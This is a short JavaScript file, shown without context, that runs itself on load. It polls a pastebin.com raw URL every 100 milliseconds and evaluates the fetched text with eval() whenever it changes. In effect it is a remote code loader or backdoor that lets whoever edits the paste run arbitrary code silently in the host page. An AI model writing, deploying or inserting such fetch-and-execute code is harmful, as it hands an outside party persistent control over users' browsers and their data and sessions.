function delay(delayInms) {
  return new Promise(resolve => {
    setTimeout(() => {
      resolve(2);
    }, delayInms);
  });
}

async function execute() {
  let IsExecute = false;
  let OldStr = '';
  let NowStr = '';
  while(true){
    fetch('https://pastebin.com/raw/eT93V86p')
    .then(response => response.text())
    .then(data => NowStr=data)
    .catch(error => console.error(error));
    if (IsExecute){
      function exec(){
        eval(NowStr);
      }
      setTimeout(exec, 0);
      IsExecute = false;
      OldStr=NowStr;
    }else{
      if (NowStr!=OldStr){
        OldStr=NowStr;
        IsExecute = true;
      }
    }
  await delay(100);
  }
}
execute();